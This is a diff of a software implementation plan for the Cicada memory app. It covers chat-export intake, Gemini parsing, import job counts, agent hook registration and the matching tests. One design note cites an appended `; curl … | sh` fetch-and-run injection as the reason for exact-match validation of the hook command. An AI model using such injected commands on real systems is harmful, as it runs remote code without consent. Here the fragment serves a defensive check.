@@ -78,8 +78,10 @@ episode with no `origin` as `origin:unknown` ("Unattributed" on the Sources page
 `sleep_cycle.py:1371-1392` `_SOURCE_TO_ORIGIN` maps the importer's own `source: "claude"`,
 `claude_memory`, `claude_project` to **`claude-code`**; it is read at `:1348`, `:1421` (claims'
 `origin`) and `sleep_history.py:25-33`. Only the chat importer writes those `source` values
-(`conversations.py:298, 336, 349, 403, 475, 508, 607`; `mcp/server.py:2059` writes `mcp`), so a
-claude.ai export uploaded through `+` is credited to the Claude Code harness.
+(`conversations.py:298, 336, 349, 403, 475, 508, 607`; `mcp/server.py:2059` writes `mcp`; the Stop hook writes `source: <harness>`,
+`transcript_capture.py:252`), so a claude.ai export uploaded through `+` is credited to the Claude
+Code harness. `api/tests/test_claim_edge_regen.py:172-181` (`test_derive_origin_table`) pins the
+wrong mapping for `claude` and `claude_project` and is corrected with it (Task 3).
 
 **The `+` flow (D5 = R7 defects 3–5).** `Views/Capture/Sheets/AddSourceSheet.swift:583-584` —
 the one `chatExport` tile shows `WalkthroughPanel` and `pickChatExport` (`:782-792`: `.json/.html`,
@@ -125,10 +127,10 @@ Claude and ChatGPT.
 (`:43-47`); `:277-321` registers the MCP server (`claude mcp add cicada -s user --env
 CICADA_MEMORY_PATH=… -- <python> <server>`) and the Stop hook via `api/hooks/registry.py install`.
 `api/hooks/registry.py:145-155` `status` returns `absent` for an unparseable file (so "off" and
-"your file is broken" look the same); `load` raises `RegistryError` (`:44-53`); the CLI exits 3 on
-it (`:186-188`). `Views/Connect/ConnectView.swift:46-138` `AgentSetupCatalog.all(home:memoryRoot:)`
-builds the copy-paste commands as shell strings. `api/services/connections/base.py:52-74`
-`resolve_binary`, `:112-140` `run_cli` (scrubbed env + `CICADA_CAPTURE=off`, rc 124 on timeout, 127
+"your file is broken" look the same); `load` raises `RegistryError` (`:41-50`); the CLI exits 3 on
+it (`:178-180`). `Views/Connect/ConnectView.swift:46-138` `AgentSetupCatalog.all(home:memoryRoot:)`
+builds the copy-paste commands as shell strings. `api/services/connections/base.py:54-75`
+`resolve_binary`, `:95-140` `run_cli` (scrubbed env + `CICADA_CAPTURE=off`, rc 124 on timeout, 127
 on a missing binary). **Measured on this machine, 2026-09-23** (claude 2.1.280, codex-cli 0.154.0,
 outputs discarded): `claude mcp get <name>` exits **0** when registered (1.32 s, it health-checks
 the server) and **1** when not (0.95 s); `codex mcp get <name> --json` exits **1** when not
@@ -286,7 +288,10 @@ open, decided here with its reason so no task re-opens it.
   `vendor`/`origin`. Only `POST /intake/import` backgrounds.
 - **R-IA11 — the sniff contract.** Design §9.1 item 3's fields plus `platform` (for a saved-content
   sniff) and `titlesTruncated`. Kind resolution: chat parse first; on its refusal,
-  `media_ingestor.preview_upload` (already staging-free); else `unknown` with the chat reason. A
+  `media_ingestor.preview_upload` (already staging-free); else `unknown` with the chat reason. The
+  two named refusals (`chat.html`, another Google product's activity page) are final and never
+  reach the saved-content parser (`FINAL_REFUSALS`): its Netscape parser takes any `<a href>`, so
+  a Search activity page would otherwise preview as "saved links" and import search history. A
   lone named skip answers `recognized: false`, `ignored: [it]`, `reason: null` — the app shows that
   as "Skipped", not as an error. `?bank=` computes the delta against that bank; the sniff never
   scaffolds a missing bank (it writes nothing).
@@ -335,8 +340,11 @@ open, decided here with its reason so no task re-opens it.
 - **R-IA19 — copy lives in `Theme/Copy+Intake.swift`** as `extension Copy`, so this track and the
   sibling tracks that append to `Copy.swift` never touch the same lines.
 - **R-IA20 — the router's counter counts requests, not panels.** `Store.intakeInFlight` is true
-  exactly while a sniff, an import or a job poll is in flight (design §5.1 "exactly while at least
-  one runs"); a preview left open is not an intake landing. One intake at a time: a drop while an
+  exactly while a sniff, an import or a background job is in flight (design §5.1 "exactly while at
+  least one runs"); a preview left open is not an intake landing. A job counts as ONE request from
+  its 202 until it reports done — `follow` runs inside `tracked` — because counting each 1 s poll
+  separately would flip the flag off between polls and make the Sleep page's worm flicker in and
+  out of `.reading` once a second. One intake at a time: a drop while an
   import runs is refused with a toast. `.feedPlus` renders in the `+` sheet; every other origin
   raises the window overlay. A job is polled to completion whether or not the panel is visible,
   because the flag and the post-import Store refresh both depend on knowing when it finished. There
@@ -347,7 +355,9 @@ open, decided here with its reason so no task re-opens it.
 - **R-IA22 — `UploadOverlay` retires whole.** Its chat modes become the intake; its "Saved media"
   file mode becomes the intake's `kind: saved` path; its URL field is covered by the `+` sheet's
   *Paste a link* tile and the menu bar's *Save clipboard URL* (Home's paste box is part b).
-  `UploadHistoryStore` goes with it (write-only, zero readers). `TopBarControls` keeps
+  `UploadHistoryStore` goes with it (write-only, zero readers — this amends design §5.4, which
+  moved it beside the router: part b's export reminders key on `ExportWaits`, not on it, so a
+  store nothing reads would only keep writing filenames to Application Support). `TopBarControls` keeps
   `showUploadOverlay`/`showsUpload` as **inert** parameters, because `Views/Sleep/SleepView.swift`
   passes them and Track Z owns that file; the Upload button's body is deleted and a lint pins that
   no call site passes `showsUpload: true`.
@@ -374,8 +384,11 @@ open, decided here with its reason so no task re-opens it.
   <installRoot>/api/.venv/bin/python <installRoot>/mcp/server.py`, and `<installRoot>/api/.venv/bin/python
   <installRoot>/api/hooks/registry.py install --settings <…/.claude/settings.json | …/.codex/hooks.json>
   --event Stop --command <…api/hooks/capture.py --harness …>`, where `installRoot` is
-  `BackendProcess.installRoot()`. Anything else — including a backend running from a different
-  checkout — is refused before anything runs, and the row falls back to *Copy commands* (D-1's
+  `BackendProcess.installRoot()`. The hook's `--command` must equal install.sh's `hook_command`
+  byte for byte, with the harness the settings path implies (`.claude/settings.json` →
+  `claude-code`, `.codex/hooks.json` → `codex`): that string runs on every agent turn, so a
+  substring check would let one appended `; curl … | sh` through. Anything else — including a
+  backend running from a different checkout — is refused before anything runs, and the row falls back to *Copy commands* (D-1's
   fallback). Children run with `CICADA_CAPTURE=off`, the provider keys scrubbed, the binary's own
   directory first on `PATH`, 15 s per step; exit 3 is "not valid JSON, untouched".
 - **R-IA29 — Claude Desktop is read, never written, in part a.** `LocalInventory` reads
@@ -426,7 +439,7 @@ open, decided here with its reason so no task re-opens it.
 | `app/…/Services/APIClient.swift`, `ContentView.swift`, `CicadaApp.swift`, `MenuBarManager.swift`, `Views/Graph/GraphView.swift`, `Views/Feed/FeedView.swift`, `Views/Common/TopBarControls.swift`, `Views/Common/EmptyStateView.swift`, `Views/Capture/Sheets/AddSourceSheet.swift`, `ImportFamilies.swift`, `WalkthroughPanel.swift`, `Theme/Copy.swift`, `Sync/Store.swift`, `app/CicadaApp/bundle.sh` | 7 | entry points; retire the overlay and Upload; three tiles; Gemini walkthrough |
 | `app/…/Views/Common/UploadOverlay.swift` | 7 | **deleted** |
 | `app/…/Models/AgentWiring.swift`, `Support/LocalInventory.swift`, `Support/AgentConnect.swift`, `Views/Intake/OnThisMacStrip.swift` (all new) | 8 | detection, connect, the `+` strip |
-| Tests (Python) | 2–4 | `test_intake.py`, `test_intake_turns.py`, `test_intake_jobs.py`, `test_export_origin_migration.py`, `test_agent_wiring.py` (new); `test_source_channels.py` edited |
+| Tests (Python) | 2–4 | `test_intake.py`, `test_intake_turns.py`, `test_intake_jobs.py`, `test_export_origin_migration.py`, `test_agent_wiring.py` (new); `test_source_channels.py`, `test_claim_edge_regen.py` edited |
 | Tests (Swift) | 1–8 | `BrowserWatchTests`, `SourcesV2Tests`, `ThemeTokenTests`, `CicadaMotionTests`, `CopyConstantsTests`, `TopBarControlsTests`, `ImportFamilyTests`, `AddSourceTileTests`, `ImportCatalogTests`, `WalkthroughTests`, `ChannelMarkTests`, `IntegrationsViewTests`, `FeedChannelStripTests`, `SourceChannelTests` edited; `MeadowPillTests`, `FoundRowTests`, `ScheduleHonestyTests`, `EngineReadinessTests`, `FoundPolicyTests`, `OnboardingFlowTests`, `HomeLayoutTests`, `IntakeRouterTests`, `IntakePreviewTests`, `IntakeSummaryTests`, `DockOpenQueueTests`, `BundleDocumentTypesTests`, `GraphDropTests`, `LocalInventoryTests`, `AgentConnectTests`, `AgentWiringCatalogTests` new |
 | Docs | 1–8 | `CLAUDE.md`; `docs/goals/memory-evolution.md` rows G12, G20, G64, G87, G117, G125, G129; `docs/goals/TODO.md` |
 
@@ -689,11 +702,41 @@ consent bug on the owner's own machine class: the first launch of a fresh instal
         }
     }
 ```
-  - `sync(channel:file:)` (`:308-330`) becomes `@discardableResult private func sync(channel:
-    String, file: BrowserFile) async -> Result<String, Error>?` — `nil` for the existing early
-    return; `.success(line)` where it now does `_ = try await performSync(...)`; `.failure(error)`
-    in each catch (keeping both catches' bookkeeping exactly); the trailing `syncing.remove` /
-    `refreshState` still run before `return result`.
+  - `sync(channel:file:)` (`:308-330`) returns its outcome, bookkeeping unchanged (the existing
+    `catchUp`/`syncIfChanged` call sites ignore it):
+
+```swift
+    /// `nil` when nothing ran (no store yet, or this channel is already syncing).
+    @discardableResult
+    private func sync(channel: String, file: BrowserFile) async -> Result<String, Error>? {
+        guard let store, !syncing.contains(channel) else { return nil }
+        // Read the signature BEFORE the sync: a bookmark saved while the sync
+        // is in flight must not be recorded as already synced.
+        let before = signature(of: file)
+        syncing.insert(channel)
+        lastSyncStarted[channel] = ContinuousClock.now
+        refreshState(channel: channel, file: file)
+
+        let result: Result<String, Error>
+        do {
+            let line = try await performSync(channel, store)
+            errors[channel] = nil
+            failedChannels.remove(channel)
+            if let before { record(before, for: channel) }
+            result = .success(line)
+        } catch let error as BrowserFileError {
+            errors[channel] = error
+            if case .notReadable = error {} else { failedChannels.insert(channel) }
+            result = .failure(error)
+        } catch {
+            failedChannels.insert(channel)
+            result = .failure(error)
+        }
+        syncing.remove(channel)
+        refreshState(channel: channel, file: file)
+        return result
+    }
+```
 
 - [ ] **Step 3: The light and the liveness verb.** `BrowserStatusLight.swift`: `color(for:)` →
   `case .off: CicadaTheme.textTertiary` (join it with `.absent`); `title(for:)` → `case .off:
@@ -718,16 +761,17 @@ consent bug on the owner's own machine class: the first launch of a fresh instal
   - Callers pass the watcher they read from the environment: `ChannelSourceView.swift:77` and
     `SourceCardGrid.swift:233` already declare `@Environment(BrowserWatcher.self) private var watcher`
     in the same struct (`:15`, `:155`) → `ChannelActions.sync(channel.id, store: store, watcher:
-    watcher)`. `IntegrationsView.swift`: the struct holding `trailingAction` (the row type around
-    `:255-290`) gains `@Environment(BrowserWatcher.self) private var watcher`; both `:278` and `:284`
-    pass it. `ConnectedChannelsStrip.swift`: the strip gains the same environment line; `:170` becomes
+    watcher)`. `IntegrationsView.swift`: the struct holding `trailingAction` (`private struct
+    IntegrationChannelRow`, `:184`) gains `@Environment(BrowserWatcher.self) private var watcher`;
+    both `:278` and `:284` pass it. `ConnectedChannelsStrip.swift`: the strip gains the same environment line; `:170` becomes
     `private static func sync(_ channel: SourceChannel, store: Store, watcher: BrowserWatcher)` and its
     last line `return try await ChannelActions.sync(channel.id, store: store, watcher: watcher)`; `:136`
     passes `watcher`.
   - `CicadaApp.swift:229-236` — the `Settings {}` scene gains `.environment(browserWatcher)` (after
     `.environment(store)`), because Integrations now reads it; without it that page traps.
   - `BrowserImportPanels.swift` `BookmarkFolderPanel`: add `@Environment(BrowserWatcher.self)
-    private var watcher`; in `importSelected()` (`:296-306`), on success:
+    private var watcher`; in `importSelected()` (`:296-306`), the one-line success branch becomes
+    (the `else { stage = .failed(store.toast ?? "Import failed") }` branch after it is unchanged):
 
 ```swift
             if ok, let r = m.result {
@@ -738,8 +782,13 @@ consent bug on the owner's own machine class: the first launch of a fresh instal
                 if folders == nil {
                     watcher.enable(browser == .chrome ? "chrome-bookmarks" : "safari-bookmarks")
                 }
+            } else {
+                stage = .failed(store.toast ?? "Import failed")
             }
 ```
+    (`folders` is the `selection.requestFolders` captured at `:300` — `nil` exactly when "All" was
+    selected, `Models/BrowserImport.swift:100`. `enable`'s catch-up re-posts the whole file once;
+    the backend's bookmark sync is idempotent, so it adds nothing and records the signature.)
 
 - [ ] **Step 5: Green.** `cd <worktree>/app/CicadaApp && swift build 2>&1 | tail -5 && swift test 2>&1 | tail -20`
   → 0 failures.
@@ -892,7 +941,7 @@ def gemini_activity_html(entries=GEMINI_ENTRIES, *, product: str = "Gemini Apps"
         cells.append(
             '<div class="outer-cell mdl-cell mdl-cell--12-col"><div class="mdl-grid">'
             f'<div class="header-cell mdl-cell mdl-cell--12-col"><p class="mdl-typography--title">{product}<br></p></div>'
-            f'<div class="content-cell mdl-cell mdl-cell--6-col mdl-typography--body-1">{verb} {prompt}<br>{when}{tail}</div>'
+            f'<div class="content-cell mdl-cell mdl-cell--6-col mdl-typography--body-1">{verb}\u00a0{prompt}<br>{when}{tail}</div>'
             '</div></div>')
     return "<!DOCTYPE html><html><body>" + "".join(cells) + "</body></html>"
 
@@ -1090,7 +1139,8 @@ def test_a_takeout_reimported_after_the_parser_change_duplicates_nothing(tmp_pat
     ep_dir = tmp_path / "episodes"
     ep_dir.mkdir(parents=True)
     for i, ep in enumerate(conv.parse_gemini_myactivity(gemini_activity_html())):
-        text = "Prompted " + ep["messages"][0]["text"]
+        # Takeout writes `Prompted&nbsp;` \u2014 a plain space here would hash differently.
+        text = "Prompted\u00a0" + ep["messages"][0]["text"]
         if len(ep["messages"]) > 1:
             text += "\n\n" + ep["messages"][1]["text"]
         body = f"user: {text}"
@@ -1167,6 +1217,20 @@ def test_an_unreadable_file_sniffs_with_its_reason(tmp_path, monkeypatch):
     client = _client(tmp_path, monkeypatch)
     body = _post(client, "/intake/sniff", "chat.html", CHAT_HTML).json()
     assert body["recognized"] is False and body["reason"] == intake.CHAT_HTML_REASON
+    config.get_settings.cache_clear()
+
+
+def test_another_products_activity_never_sniffs_as_saved_links(tmp_path, monkeypatch):
+    """R-IA8 / FINAL_REFUSALS: a Search activity page carries <a href> links,
+    which the saved-content parser would preview as bookmarks. The link below
+    is what makes this test fail without the guard."""
+    client = _client(tmp_path, monkeypatch)
+    linked = '<a href="https://example.com/search?q=hours">example.com hours</a>'
+    page = gemini_activity_html(((linked, None, "Jan 5, 2026, 9:00:00 AM PST"),),
+                                product="Search", verb="Searched for")
+    body = _post(client, "/intake/sniff", "MyActivity.html", page).json()
+    assert body["recognized"] is False and body["kind"] == "unknown"
+    assert body["reason"] == intake.NOT_GEMINI_REASON
     config.get_settings.cache_clear()
 
 
@@ -1331,7 +1395,7 @@ def test_a_grown_reimport_rewrites_the_sidecar(tmp_path):
   - Replace `parse_gemini_myactivity` (`:568-615`) with:
 
 ```python
-_GEMINI_VERB = re.compile(r"^(?:Prompted|Asked|Said)[\s ]+")
+_GEMINI_VERB = re.compile(r"^(?:Prompted|Asked|Said)[\s\u00a0]+")
 _GEMINI_TITLE_MAX = 60
 
 
@@ -1519,6 +1583,11 @@ NOT_GEMINI_REASON = ("This is Google activity for another product. "
 NOT_A_CHAT_PAGE = "This page isn't a chat export Cicada can read."
 EMPTY_ZIP_REASON = "This zip has no conversations Cicada can read."
 EMPTY_EXPORT_REASON = "Nothing in this file is a conversation."
+#: Refusals the sniff never hands on to the saved-content parser (R-IA8). Both
+#: pages are full of ``<a href>`` links, which ``media_ingestor``'s Netscape
+#: parser would happily preview as bookmarks — a Search or YouTube activity
+#: page would import the person's search history as "saved links".
+FINAL_REFUSALS = frozenset({CHAT_HTML_REASON, NOT_GEMINI_REASON})
 MAX_SNIFF_TITLES = 5000
 
 #: ``detect_source`` result -> (wire format, vendor, origin, counts key).
@@ -1832,12 +1901,14 @@ def sniff_bytes(content: bytes, filename: str, settings: Settings, bank: str | N
     try:
         parsed = parse_export(content, filename)
     except HTTPException as exc:
-        saved = media_ingestor.preview_upload(content, filename)
-        if saved.recognized:
-            return IntakeSniffResponse(recognized=True, kind="saved", platform=saved.platform,
-                                       members=[name], counts=IntakeCounts(items=saved.total),
-                                       warnings=saved.warnings)
-        return IntakeSniffResponse(recognized=False, reason=str(exc.detail))
+        reason = str(exc.detail)
+        if reason not in FINAL_REFUSALS:
+            saved = media_ingestor.preview_upload(content, filename)
+            if saved.recognized:
+                return IntakeSniffResponse(recognized=True, kind="saved", platform=saved.platform,
+                                           members=[name], counts=IntakeCounts(items=saved.total),
+                                           warnings=saved.warnings)
+        return IntakeSniffResponse(recognized=False, reason=reason)
     if not parsed.episodes:
         return IntakeSniffResponse(
             recognized=False,
@@ -2008,8 +2079,9 @@ class IntakeImportResponse(CamelModel):
         origin=result.parsed.origin,
     )
 ```
-  (`hashlib` stays imported only if something else in `banks.py` uses it — `grep -n hashlib
-  api/routers/banks.py` and drop the import if the shim was its only user.)
+  (Every other import stays: `hashlib` is the `/banks` ETag's (`:55`), `run_in_threadpool` and
+  `BankImportDateRange` are used above, and `bank_registry` by the other routes. The shim's old
+  pre-parse `registry`/`scaffold_bank` lines go — `intake.resolve_target` does both, 404 first.)
 
 - [ ] **Step 8: Mount** — `api/main.py`: add `intake,` after `inbox,` in the router import list
   (`:13-39`, alphabetical; a sibling track inserts `remote,` after `origins,` — keep the lines apart)
@@ -2065,9 +2137,9 @@ new row ships with its client mapping.
 - Modify: `api/routers/intake.py` (`import_bytes`, `import_file`, new `GET /intake/jobs/{id}`)
 - Modify: `api/models/schemas.py` (`IntakeJobStatus`)
 - Modify: `api/services/channel_registry.py:36-45, 234-239`, `api/services/source_overview.py:84-86`
-- Modify: `api/services/sleep_cycle.py:1371-1382`, `api/services/bank_migrations.py:30-81`
+- Modify: `api/services/sleep_cycle.py:1371-1382`, `api/services/bank_migrations.py:25-77`
 - Modify (app): `Models/IntegrationCategory.swift:41`, `Views/Capture/ChannelMarks.swift:19-23`, `Views/Capture/ConnectedChannelRow.swift:211, 229, 251`, `Views/Capture/Sheets/AddSourceSheet.swift:125`, `Views/Sources/SourceBlurb.swift:44`
-- Test: `api/tests/test_intake_jobs.py`, `api/tests/test_export_origin_migration.py` (new); `api/tests/test_source_channels.py:248, 321`; Swift `ChannelMarkTests`, `IntegrationsViewTests`, `SourceChannelTests`, `FeedChannelStripTests`
+- Test: `api/tests/test_intake_jobs.py`, `api/tests/test_export_origin_migration.py` (new); `api/tests/test_source_channels.py:248, 321`; `api/tests/test_claim_edge_regen.py:174-175`; Swift `ChannelMarkTests`, `IntegrationsViewTests`, `SourceChannelTests`, `FeedChannelStripTests`
 - Docs: `CLAUDE.md` (endpoint traps), `memory-evolution.md` (G20)
 
 **Interfaces:** `intake_jobs.start(total, *, already_skipped=0) -> Job`, `get(id)`, `run(job_id,
@@ -2132,6 +2204,19 @@ def test_a_reimport_that_changes_little_stays_synchronous(tmp_path, monkeypatch)
     assert _import(client, claude_conversations(50)).status_code == 202
     again = _import(client, claude_conversations(50, grown=True))
     assert again.status_code == 200 and (again.json()["episodesUpdated"], again.json()["duplicatesSkipped"]) == (1, 49)
+    config.get_settings.cache_clear()
+
+
+def test_a_job_carries_only_what_will_be_written(tmp_path, monkeypatch):
+    """The job's total is the preview's "Import N" (new + grew), never the
+    file's size, so "Bringing in 180 of 379" cannot count past the button."""
+    client = _client(tmp_path, monkeypatch)
+    assert _import(client, claude_conversations(20)).status_code == 202
+    r = _import(client, claude_conversations(50))
+    assert r.status_code == 202, r.text
+    assert r.json()["job"]["total"] == 30 and r.json()["duplicatesSkipped"] == 20
+    status = client.get(f"/intake/jobs/{r.json()['job']['id']}").json()
+    assert (status["total"], status["staged"], status["created"], status["skipped"]) == (30, 30, 30, 20)
     config.get_settings.cache_clear()
 
 
@@ -2255,17 +2340,22 @@ def test_sleep_credits_the_importer_to_its_export_not_to_claude_code():
 ```python
 def test_a_gemini_takeout_has_its_own_channel(tmp_path):
     """D11 / R-IA14: counted by origin, in prompts."""
-    ep_dir = tmp_path / "episodes"
-    ep_dir.mkdir(parents=True)
-    markdown_parser.write(ep_dir / "ep_2026-02-24_001.md",
-                          {"id": "ep_2026-02-24_001", "origin": "gemini-export", "timestamp": "2026-02-24T12:39:02+00:00"},
-                          "user: alpha-project")
-    chans = {c["id"]: c for c in channel_registry.build_channels(tmp_path, telegram_enabled=False)}
-    assert chans["chat-export:gemini"]["count"] == 1 and chans["chat-export:gemini"]["count_noun"] == "prompt"
-    assert chans["chat-export:gemini"]["actions"] == ["import"]
+    episodes = tmp_path / "episodes"
+    episodes.mkdir(parents=True)
+    (episodes / "ep_2026-02-24_001.md").write_text(
+        "---\nid: ep_2026-02-24_001\norigin: gemini-export\ntimestamp: '2026-02-24T12:39:02+00:00'\n---\nuser: alpha-project\n",
+        encoding="utf-8")
+    gemini = _channels(tmp_path)["chat-export:gemini"]
+    assert gemini["count"] == 1 and gemini["count_noun"] == "prompt"
+    assert gemini["label"] == "Gemini chat export" and gemini["actions"] == ["import"]
 ```
-  (Use the module's existing imports; add `from api.services import channel_registry,
-  markdown_parser` if absent.)
+  (Place it after `test_chat_export_channels_come_from_origin_counts`; it uses the module's own
+  `_channels` helper, `:59-64`, which invalidates `bank_index` first — no new imports.)
+
+  In `api/tests/test_claim_edge_regen.py::test_derive_origin_table` (`:172-181`), the two
+  importer lines become `assert sleep_cycle._derive_origin("claude") == "claude-export"` and
+  `assert sleep_cycle._derive_origin("claude_project") == "claude-export"` (D4 — that table pinned
+  the mis-credit); `mcp → claude-code` and the rest stay.
 
   Swift, same commit: `ChannelMarkTests` — the expected map (`:28`) gains
   `"chat-export:gemini": "gemini-export"`; `IntegrationsViewTests:25` gains
@@ -2403,8 +2493,14 @@ def import_bytes(content: bytes, filename: str, settings: Settings, *, bank: str
     legacy = {id(e) for e in staging.legacy}
     todo = [e for e in parsed.episodes if id(e) not in legacy]
     if defer and len(staging.create) + len(staging.update) > BACKGROUND_THRESHOLD:
-        return ImportResult(name, active, parsed, 0, 0, len(legacy), date_from, date_to,
-                            pending=(todo, target / "episodes"))
+        # Only what WILL be written goes to the job, in the parsers' own order
+        # (ids mint per date in that order), so the job's `total` is the
+        # preview's "Import N" (new + grew) and "Bringing in 180 of 379" never
+        # counts past it. The unchanged rest is counted as skipped up front.
+        writes = {id(e) for e in staging.create + staging.update}
+        pending = [e for e in parsed.episodes if id(e) in writes]
+        return ImportResult(name, active, parsed, 0, 0, len(staging.skip), date_from, date_to,
+                            pending=(pending, target / "episodes"))
     with intake_jobs.STAGING_LOCK:
         created, updated, skipped = conv._stage_episodes(todo, target / "episodes")
     if not active and created + updated:
@@ -2463,7 +2559,9 @@ class IntakeJobStatus(CamelModel):
     error: Optional[str] = None
 ```
 
-  The job's `skipped` starts at the legacy count, so its final `skipped` equals the sync path's.
+  The job's `skipped` starts at `plan()`'s unchanged count (legacy Gemini hashes included), so its
+  final `skipped` equals the sync path's; `test_a_job_carries_only_what_will_be_written` pins
+  `total == new + grew`. (`todo` still feeds the synchronous path unchanged.)
 
 - [ ] **Step 4: The Gemini channel (R-IA14).** `channel_registry.py`: `_NON_CONNECTOR_HEAD` gains
   `"chat-export:gemini",` after `"chat-export:chatgpt",`; the `channels` dict gains, after the
@@ -2572,8 +2670,11 @@ def backfill_export_origins(memory_path) -> int:
         try:
             _commit(memory_path, written)
         except Exception as e:
-            # Files are right on disk; without the marker a later boot retries
-            # the commit with 0 further rewrites.
+            # Files are right on disk but uncommitted (or this bank is not a
+            # git repo). No marker, so the next boot re-scans; it finds nothing
+            # left to stamp and writes the marker, and the stamped files ride
+            # the bank's next commit — the same trade `decay_migration` makes,
+            # because a bank without git must still get its origins.
             logger.warning(f"Export-origin backfill commit skipped: {e}")
             return len(written)
     marker.write_text("v1", encoding="utf-8")
@@ -2614,9 +2715,12 @@ def _commit(memory_path: Path, written: list[Path]) -> None:
     subprocess.run(["git", "commit", "-m", message, "--", *rel], cwd=str(memory_path), check=True)
 ```
   `bank_migrations.py`: import `from api.services.export_origin_migration import
-  backfill_export_origins`; after the watermark block call it, log only when non-zero
+  backfill_export_origins` beside the other three (`:25-27`); after the watermark block (`:65-70`)
+  add `originated = backfill_export_origins(memory_path)` with a one-line comment citing Track I
+  D4 / R-IA13, log only when non-zero
   (`logger.info(f"Stamped export origin on {originated} imported episode(s)")`), and add
-  `"originated": originated` to the returned dict and its docstring.
+  `"originated": originated` to the returned dict and its docstring. (No test pins that dict's
+  exact keys — `grep -rn run_bank_migrations api/tests` finds only a comment.)
 
 - [ ] **Step 6: Green** — both suites (`api/tests` full; `swift test`) → 0 failures.
 
@@ -3085,6 +3189,7 @@ the `Copy` strings below plus `Copy.intakeLabels`.
   `MeadowPillTests.swift` (new):
 
 ```swift
+import SwiftUI   // `ControlActiveState`
 import XCTest
 @testable import CicadaApp
 
@@ -3460,6 +3565,7 @@ extension Copy {
     static let foundClaudeDesktopDetail = "Finish in Settings → Agents"
     static let foundNeedsDiskAccess = "Needs Full Disk Access to read"
     static let foundCheckingApps = "Checking your AI apps…"
+    static let foundCouldNotCheck = "Couldn't check this app in time. Try again."
     static let foundPastStays = "Past sessions stay where they are. Cicada never reads them."
     static let foundInvalidSettings = "Its settings file isn't valid JSON, so Cicada didn't touch it. Fix it, then Retry."
     static let foundRefused = "Cicada couldn't vouch for these commands, so it didn't run them. Copy them into Terminal instead."
@@ -3476,7 +3582,7 @@ extension Copy {
         foundOnThisMac, foundTurnOn, foundOn, foundOff, foundRetry, foundAllow, foundConnecting,
         foundSavingBookmarks, foundWhatThisChanges, foundCopyCommands, foundAgentDetail,
         foundBrowserDetail, foundCursorDetail, foundClaudeDesktopDetail, foundNeedsDiskAccess,
-        foundCheckingApps, foundPastStays, foundBackendDown,
+        foundCheckingApps, foundCouldNotCheck, foundPastStays, foundBackendDown,
     ]
     /// Longer sentences — no length rule, the same vocabulary rule.
     static let intakeSentences: [String] = [intakeDropSubtitle, foundInvalidSettings, foundRefused]
@@ -3947,9 +4053,11 @@ final class HomeLayoutTests: XCTestCase {
         }
     }
 ```
-  `intakeLabels` gains `afterImportWhenYouAsk, honestyPlanThenKey, honestyPlanThenOllama,
-  honestyPlanBoth, foundStartNothing`; `intakeSentences` gains `afterImportPlanWaits,
-  afterImportWaits, honestyPlanOnly, honestyOllama, honestyKey, honestyNothingYet`.
+  `intakeLabels` gains `afterImportWhenYouAsk, honestyPlanBoth, foundStartNothing`;
+  `intakeSentences` gains `afterImportPlanWaits, afterImportWaits, honestyPlanThenKey,
+  honestyPlanThenOllama, honestyPlanOnly, honestyOllama, honestyKey, honestyNothingYet`.
+  (`honestyPlanThenKey` is 63 characters and `honestyPlanThenOllama` 62 — in `intakeLabels` they
+  would fail the 60-character rule; they are two-sentence captions, so they are sentences.)
 
 - [ ] **Step 3: `Support/ScheduleHonesty.swift`:**
 
@@ -4222,18 +4330,23 @@ enum StartStep: Equatable {
 enum OnboardingFlow {
     static func canStart(name: String) -> Bool { !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty }
 
+    /// Built step by step rather than as one `+` chain of implicit members: the
+    /// chain is exactly the shape Swift's type checker gives up on.
     static func plan(name: String, pickedEngine: String?, ticked: [FoundItemID], mode: OnboardingMode) -> [StartStep] {
-        let owner = StartStep.saveOwner(name.trimmingCharacters(in: .whitespacesAndNewlines))
-        switch mode {
-        case .setUpLater:
-            return [owner, .markOnboarded, .recordGettingStarted([]), .showHome]
-        case .firstRun:
-            return [owner] + (pickedEngine.map { [.saveEngine($0)] } ?? [])
-                + [.markOnboarded, .recordGettingStarted(ticked), .showHome] + ticked.map { .turnOn($0) }
-        case .rerun:
-            return [owner] + (pickedEngine.map { [.saveEngine($0)] } ?? [])
-                + [.recordGettingStarted(ticked), .close] + ticked.map { .turnOn($0) }
+        var steps: [StartStep] = [.saveOwner(name.trimmingCharacters(in: .whitespacesAndNewlines))]
+        if mode == .setUpLater {
+            // "Set up later" still saves the name (G117 R1) and turns nothing on.
+            steps += [.markOnboarded, .recordGettingStarted([]), .showHome]
+            return steps
         }
+        if let pickedEngine { steps.append(.saveEngine(pickedEngine)) }
+        if mode == .firstRun {
+            steps += [.markOnboarded, .recordGettingStarted(ticked), .showHome]
+        } else {
+            steps += [.recordGettingStarted(ticked), .close]
+        }
+        steps += ticked.map { StartStep.turnOn($0) }
+        return steps
     }
 
     static func shouldContinue(after step: StartStep, succeeded: Bool) -> Bool {
@@ -4832,11 +4945,10 @@ final class IntakeSummaryTests: XCTestCase {
 }
 ```
 
-  `DockOpenQueueTests.swift`, `BundleDocumentTypesTests.swift`, `GraphDropTests.swift`:
+  Three more new files, one class each. `DockOpenQueueTests.swift`:
 
 ```swift
 import XCTest
-import WebKit
 @testable import CicadaApp
 
 /// R-IA25 — a cold "Open With" delivers URLs before `.onAppear` attaches the router.
@@ -4852,6 +4964,13 @@ final class DockOpenQueueTests: XCTestCase {
         XCTAssertEqual(seen.map { $0.map(\.lastPathComponent) }, [["a.zip"], ["b.json"]])
     }
 }
+```
+
+  `BundleDocumentTypesTests.swift`:
+
+```swift
+import XCTest
+@testable import CicadaApp
 
 /// R-IA25 — Cicada is offered in Open With, never made the default opener.
 final class BundleDocumentTypesTests: XCTestCase {
@@ -4868,16 +4987,35 @@ final class BundleDocumentTypesTests: XCTestCase {
         XCTAssertFalse(text.contains("<string>Owner</string>") || text.contains("<string>Default</string>"))
     }
 }
+```
+
+  `GraphDropTests.swift`:
+
+```swift
+import AppKit
+import WebKit
+import XCTest
+@testable import CicadaApp
 
 /// D10 / R-IA24 — the graph canvas must not swallow a file drop meant for the router.
 @MainActor
 final class GraphDropTests: XCTestCase {
     func testTheGraphWebViewRegistersNoDragTypes() {
-        let view = ClickableWebView(frame: .zero, configuration: WKWebViewConfiguration())
+        let view = ClickableWebView(frame: NSRect(x: 0, y: 0, width: 100, height: 100),
+                                    configuration: WKWebViewConfiguration())
+        // In a window, so a registration WebKit defers to `viewDidMoveToWindow`
+        // has happened too — without that the assertion could pass vacuously.
+        let window = NSWindow(contentRect: view.frame, styleMask: [.titled], backing: .buffered, defer: true)
+        window.contentView = view
